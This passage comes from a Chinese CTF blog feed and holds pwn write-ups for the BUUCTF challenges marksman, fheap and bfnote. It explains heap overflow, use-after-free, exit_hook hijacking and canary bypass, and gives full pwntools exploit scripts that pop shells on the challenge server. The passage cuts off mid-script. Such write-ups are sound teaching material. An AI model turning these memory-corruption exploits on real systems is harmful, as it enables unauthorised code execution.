<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4009BD</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,lenth,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.sendline(fake_chunk)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">bss_addr=<span class="number">0x6010B0</span></span><br><span class="line">back_addr=<span class="number">0x400896</span></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload=<span class="number">72</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x41</span>)+p64(bss_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,p64(free_got_addr))</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>篡改got表</tag>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>hfctf_2020_marksman</title>
    <url>/posts/8cbdee5a.html</url>
    <content><![CDATA[<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
<p>1、atol函数放入的数据应该是打包之前的，而非是打包之后的数据</p>
<p>2、exit函数执行流程，<strong>exit函数的调用流程exit函数—&gt;run_exit_handlers函数—&gt;_dl_fini函数—&gt; rtld_lock_unlock_recursive指针</strong> 如果我们能够将最后的指针所指向的内容修改为one_gadget，那么即可获取shell。这个劫持exit_hook的可取之处在于，程序正常结束的话，最后都会调用这个exit函数</p>
<p>3、学会了重新绑定程序所对应的libc动态库（patch libc和ld）</p>
<p>4、用这个方法可以在开了PIE的程序中下断点。gdb.attach(p, ‘b * $rebase(0xd63)\nc’)</p>
<p>5、one_gadget加上参数-l2可以搜索更多的one_gadget。</p>
<p>6、即使相同的libc库，在小版本不同的情况下，某些内容的偏移也是不一样的。</p>
<span id="more"></span>



<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220323150533922-178897691.png"></p>
<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p><img src="/../img/2706180-20220323150546195-1370770969.png"></p>
<p>代码很少，漏洞也比较明显，我们可以控制v6的值，以及v7[j]。并且在printf函数中，<strong>程序自己打印了Puts的真实地址，就相当于我们已经拿到了libc基地址</strong>。</p>
<p>也就是任意地址任意写。这里跟踪一下汇编代码，是怎么实现上述的任意地址任意写的。</p>
<p><img src="/../img/2706180-20220323150556091-1654120866.png"></p>
<p><img src="/../img/2706180-20220323150609387-735205154.png"></p>
<p>根据上面两幅图片，可以发现，<strong>最后的具体实现是mov [rax],dl这部分实现的。而rax最后溯源发现是sub_B78函数的返回值。</strong></p>
<p>可以看见这个sub_B78的返回值就是atol函数的返回值（这个函数是有坑的，下面会说到）</p>
<p><img src="/../img/2706180-20220323150619184-1813218470.png"></p>
<p>dl就是edx的最低字节。<strong>注意，mov [rax],dl []会去rax里面寻址，也就是说我们修改的内容应该被rax所指向。简单来说就是rax必须是个指针，而这个指针指向我们要修改的内容（而不能把rax寄存器里面直接放成我们要修改的内容）</strong></p>
<p>值得一提的是，sub_bc2这个函数存在的目的就是去限制我们的one_gadget</p>
<p><img src="/../img/2706180-20220323150630708-1754089244.png"></p>
<p><img src="/../img/2706180-20220323150641484-1764129240.png"></p>
<p>如此，我们现在有两种方法，<strong>要么使用one_gadget参数l2，去找寻更多的one_gadget（只不过使用条件可能更苛刻），还有一种方法是将one_gadget地址减5，以此来绕过检查</strong></p>
<p><img src="/../img/2706180-20220323150651359-2138009206.png"></p>
<p><img src="/../img/2706180-20220323150701120-590746669.png"></p>
<p>可以发现libc基地址只有后一个字节是00，倒数第二个字节并不完全是0，因此我们减5的话，将one_gadget指令抬高一个指令，这样最后一个字节绕过了检查，而倒数第二个字节加上libc基地址之后，也可以绕过检查。</p>
<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>这道题明显看出来也没机会再传参了，那就考虑one_gadget（我们是知道libc基地址的）。由于还可以任意地址任意写三字节，我是优先考虑的修改函数got表，<strong>但是很快就会发现程序是开了PIE保护的。got地址并不是固定的</strong>，同时我们还泄露不了栈地址，因此这个方法就被我打消了。但是我们是知道libc基地址的，因此我们现在的思路是想办法去libc里面找个指针（这个指针还必须指向一个被执行的地址），然后通过这个指针将one_gadget写入指针所指向的地方，最后获取shell。</p>
<h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><p>通过调试发现了有三个地方都具备这样的指针。</p>
<p>①puts函数调用了__strlen_sse2</p>
<p><img src="/../img/2706180-20220323150714090-172999789.png"></p>
<p>此时该函数已经在我们的动态库里面了，并且<strong>再次jmp到 rip+0x3c9f12所指向的地方</strong>，那我们只需要以rip+0x3c9f12的地址作为跳板，去将它所指向的地方最后三字节修改为onegadget即可（由于libc中的地址都是以libc基地址加偏移来寻址，这个偏移就占最后的三字节（前面的基地址大家都一样，因此只修改三字节即可）。</p>
<p><img src="/../img/2706180-20220323150723849-815330213.png"></p>
<p>要修改的地址距离libc基地址偏移为0x3eb0a2</p>
<p>②   dlopen函数—&gt;_dlerror_run函数—&gt;_dl_catch_error函数</p>
<p><img src="/../img/2706180-20220323150734638-471411632.png"></p>
<p>这里原理同上，此时跳到了rip+0x2022a2<strong>所指向的地方</strong>。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011926034.png" alt="image-20230701192655766"></p>
<p>要修改的地址，距离libc基地址偏移0x5f4038</p>
<p>③也是我想重点讲的exit hook劫持。</p>
<p>exit函数的调用流程exit函数—&gt;__run_exit_handlers函数—&gt;_dl_fini函数—&gt; _dl_rtld_lock_recursive指针（这是个结构体指针变量）</p>
<p><img src="/../img/2706180-20220323150757504-1460403787.png"></p>
<p>而_dl_rtld_lock_recursive这个指针又指向了 __rtld_lock_default_lock_recursive</p>
<p><img src="/../img/2706180-20220323150807027-834730342.png"><br><img src="/../img/2706180-20220323150832405-1323272271.png"></p>
<p>可以看到最后又执行了这个 __rtld_lock_default_lock_recursive</p>
<p>因此我们就把这个_dl_rtld_lock_recursive指针当做跳板，去将它指向的内容（__rtld_lock_default_lock_recursive）也就是修改为one_gadget。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011927366.png" alt="image-20230701192716074"></p>
<p>因此这个rtld_lock_default_lock_recursive指针距离libc基地址的偏移为0x81df60。</p>
<p>这里我因为libc的版本卡了很久，原先我那个也是2.27，不过好像是小版本不同，最后得出来的偏移和服务器那边版本的偏移差了0x1000。</p>
<h2 id="patch-libc和ld过程"><a href="#patch-libc和ld过程" class="headerlink" title="patch libc和ld过程"></a>patch libc和ld过程</h2><p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p>
<p>这篇文章很详细的记录了patch libc和ld的过程。</p>
<p>我根据这篇文章再做一点补充</p>
<p>想要下载某个版本的libc时，先cat list（此时应该先看上面那篇文章，先下载下来glibc-all-in-one</p>
<p><img src="/../img/2706180-20220323150858134-535564640.png"></p>
<p><img src="/../img/2706180-20220323150907265-2010357906.png"></p>
<p>.&#x2F;download去下载下来你想要的libc版本（这道题应该选上图的这个版本）</p>
<p><img src="/../img/2706180-20220323150916892-736455012.png"></p>
<p>然后上面那篇文章中，这几个红色框的部分，是根据自己的路径来配置（别傻傻的全复制粘贴了）(不是红框的，一律不用改）</p>
<p><strong>这样做的好处就是，本地程序所依赖的libc库和远程的libc是一样的，这样拿到的关于libc基地址的任何偏移本地与远程就都是一样的了。</strong></p>
<p>如果遇见下面这种报错的话<br><img src="/../img/2706180-20220403102819721-1715294586.png"><br>在下载完patchelf之后，进入patchelf的目录，用下面这个命令安装一个工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool</span><br></pre></td></tr></table></figure>
<p>然后再输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure>
<p>之后就ok了。</p>
<h2 id="再说关于atoi函数的那个坑。"><a href="#再说关于atoi函数的那个坑。" class="headerlink" title="再说关于atoi函数的那个坑。"></a>再说关于atoi函数的那个坑。</h2><p>结论</p>
<p><strong>遇见atol函数的时候，要发打包前的数据，而不是打包后的数据</strong></p>
<p>因为传给atol的参数会被遇见第一个不是0~9的字符所截断 从而返回之前的值，举个例子，你想打包的数据是1234，那么被打包之后就是\x04\x03\x02\x01，这些都是不可见字符，传入atol之后直接就被截断，导致atol返回值为0，使得后续的流程是错误的。</p>
<p><img src="/../img/2706180-20220323150926759-1085603692.png"></p>
<p>exp</p>
<p>打远程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27125</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ggg=libc_base+<span class="number">0x81df60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ggg))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sss=<span class="built_in">str</span>(ggg)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span>-<span class="number">5</span></span><br><span class="line"><span class="comment">#list=p64(one_gadget)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))<span class="comment">#chr目的是将16进制转化成一个字节发过去</span></span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打本地</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xiamian&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">strlen=libc_base+<span class="number">0x3eb0a8</span><span class="comment">#这里我最开始调试得到的偏移是这个0x3eb0a8（当时我用的是本机自带的libc）,然后patch另一个libc之后，就变成0x3eb0a2了（我最开始用0x3eb0a8是打通了的）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(p64(puts_addr))</span><br><span class="line">sss=<span class="built_in">str</span>(strlen)</span><br><span class="line">p.sendline(sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe54fe</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>如果复制粘贴还打不通的话，九成九是libc版本的问题（本人就一菜鸡，如果写的哪有问题，欢迎指正）。</p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>劫持exit_hook</tag>
      </tags>
  </entry>
  <entry>
    <title>hctf2016_fheap</title>
    <url>/posts/f50f2cd6.html</url>
    <content><![CDATA[<p>本题为一道经典的控制堆块的题目，对于这类题目通常的方法是将控制堆块申请出来当做用户堆块来使用，向其写入特定数据来篡改其中的函数指针。</p>
<span id="more"></span>

<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122218987.png" alt="image-20221112221838443"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><blockquote>
<p>一个堆块A中记录了另一个堆块B的地址，而show、edit、delete函数是通过访问堆块A中的堆块B的地址来进行相应的操作，我将这类堆块A称之为控制堆块</p>
</blockquote>
<p>本题只有add和delete函数，而delete函数的释放堆块处是通过控制堆块中存放的free函数的指针来实现的。分析add函数后，可以知道控制堆块的结构如下:</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122227841.png" alt="image-20221112222749786"></p>
<p>本题的libc版本为2.23，存在的漏洞为UAF，程序所申请的控制堆块最终的大小是0x30.</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>通常对于控制堆块相关的题目(要存在UAF漏洞)，我们首先考虑能否将控制堆块给申请出来，通常的策略是将两个控制堆块给释放掉，然后申请一个和控制堆块等大的堆块，加上一个控制堆块，这样原本的两个控制堆块就全出来了，因为UAF漏洞的原因，我们可以往刚申请出来的用户堆块中写入数据(而它还是另一组堆块中的控制堆块)，从而篡改控制堆块中的函数指针。</p>
<p>注意：</p>
<ol>
<li>首先我们申请堆块的大小是由输入字符串的长度来决定的(如果出现了00会把strlen函数给截断)</li>
<li>申请堆块时，给bss段存的是控制堆块的地址。而这个索引的分配是选择了当前第一个空闲的标志位为0的堆块地址进行分配。举个例子如果我先申请了堆块A和堆块B，然后释放掉堆块A的话，再次申请一个堆块，该控制堆块的地址会覆盖原本堆块A的控制堆块**(而非因为UAF，在堆块B之后分配一个新的地址)**</li>
</ol>
<p>综上所述，我们做如下布局:</p>
<p>申请堆块A和堆块B(由于输入的数据小于0xf，因此不会创建出来用户堆块，此时堆块A和堆块B为控制堆块)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122343486.png" alt="image-20221112234354615" style="zoom:50%;" />



<p>接着我们申请出来一个与控制堆块等大的堆块(如下) </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130852198.png" alt="image-20221113085209676"></p>
<p>因此我们可以控制0x555555759030这个堆块里的函数指针(因为它位于bss段，所以还可以被当做控制堆块使用)，原本堆块中就残留了一个函数地址，我们修改后两个字节(爆破半个字节)，写入puts函数的plt地址。来泄露程序基地址(puts函数执行时会将0x18个a以及后面的puts的plt地址全部打印出来)</p>
<p>此时的payload为:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p>而之后的操作，全都如法炮制。去劫持函数指针进行篡改，先泄露libc地址(改函数指针为printf函数的plt表，利用格式化字符串漏洞来泄露libc(只控制printf函数的第一个参数即可))，再控制函数指针为system地址，参数给一个&#x2F;bin&#x2F;sh;即可。 使用&#x2F;bin&#x2F;sh;而没有使用&#x2F;bin&#x2F;sh\x00的原因是因为避免字符串中间出现00使字符串被截断。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give string size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;str:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure?:&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCED</span>,<span class="number">0xCC2</span>,<span class="number">0xE93</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    base_addr=leak_addr-<span class="number">0x990</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;%21$p&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">5</span>)+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]+base_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x78c0f</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(sys_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)   </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27051&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130916753.png" alt="image-20221113091621333"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>UAF</tag>
        <tag>控制堆块</tag>
      </tags>
  </entry>
  <entry>
    <title>gyctf_2020_bfnote</title>
    <url>/posts/2d29ef23.html</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本题的学习与总结有:</p>
<ol>
<li>本题与starctf2018_babystack这题一样，考察的都是篡改TLS中的stack_guard从而绕过canary的检查，因为在2.23和2.27 32位的glibc里面主线程的TLS是位于mmap映射出来的内存，并且位置固定并不随机。而本题可以通过数组索引无限制，而在mmap映射出来的区域精准的修改某个内存，这就给了篡改TLS中的stack_guard的机会</li>
<li>本题的难点在于之后绕过canary，无法正常的泄露libc地址，从而造成了一定难度，通过学习网上各位师傅的wp，发现本题一共有三种做法，分别是利用magic gadget篡改got表，ret2dl以及攻击IO_FILE。这里我采用的是利用magic gadget篡改got表</li>
</ol>
<span id="more"></span>

<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281654944.png" alt="image-20221128165410736" style="zoom:50%;" />

<h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281657108.png" alt="image-20221128165734005"></p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我们现在拥有栈溢出控制执行流的机会，以及利用索引无限制任意地址写的机会。</p>
<p>先说如何劫持TLS里的stack_guard来绕过canary</p>
<ol>
<li>先利用malloc申请一个超大内存，观察一下mmap映射出来的地址和TLS中stack_guard的距离</li>
<li>在最后的数组索引无限制的read里去篡改stack_guard保持其和栈里覆盖掉的canary一样即可</li>
</ol>
<p>如图</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281712774.png" alt="image-20221128171243112" style="zoom:50%;" />

<p>考虑到在数组里索引又被加了0x10，所以最后实际的偏移应该为0x5170c-0x10，这样即可篡改stack_guard(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281714096.png" alt="image-20221128171415975"></p>
<p>由于本题的保护是parital relro，可以篡改got表。并且libc地址的后三位是固定不变的，其实我们可以打一个rop去read往atol的got表里读入数据(atol和system的真实地址只有后五位不一样)如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281718462.png" alt="image-20221128171802376" style="zoom:50%;" />

<p>所以我们可以直接去read读入数据控制atol的后两位为system的地址，此时也仅仅有三位不一样了，到这里爆破一下的话也有1&#x2F;4096的概率(如果实在没办法的话，爆破一下也不是不行)。</p>
<p>但是我们去观察一下可用的gadget发现了这个inc指令(如下)</p>
<blockquote>
<p>inc b相当于add b,1，速度比add指令更快</p>
</blockquote>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281720294.png" alt="image-20221128172035296"></p>
<p>同时看了一下关于ebp的gadget发现能够控制ebp(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281722465.png" alt="image-20221128172221197"></p>
<p>这就意味着我们能利用那段magic gadget来让指定的内存加1，因为紧跟ret的存在，所以能够不断执行这段gadget，而atol和system除去末尾的三位固定外，前面的部分虽然随机但是却存在固定的偏移，我们可以控制ebp-0x17fa8b40为atol函数的第三字节的地址，不断的执行inc指令，最终加到和system一样的值。</p>
<p>篡改成功后让执行流迁移到0x08048656这个地址，read读入&#x2F;bin&#x2F;sh调用atol的时候获取shell。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26281&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x0804882A</span>,<span class="number">0x08048907</span>,<span class="number">0x080487BA</span>,<span class="number">0x8048973</span>)</span><br><span class="line">leave_ret=<span class="number">0x08048578</span></span><br><span class="line">inc_ebp=<span class="number">0x08048434</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x32</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A060</span>+<span class="number">4</span>)+p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your description : &quot;</span>,payload)</span><br><span class="line">payload=p32(<span class="number">0x080489db</span>)+p32(<span class="number">0x804a02d</span>+<span class="number">0x17fa8b40</span>)+p32(inc_ebp)*<span class="number">0xd9</span><span class="comment">#0xdb</span></span><br><span class="line">payload+=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">0x08048656</span>)+p32(<span class="number">0</span>)+p32(e.got[<span class="string">&#x27;atol&#x27;</span>])+p32(<span class="number">0x100</span>)+p32(<span class="number">0x08048656</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your postscript : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your notebook size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x50000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your title size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5170c</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span 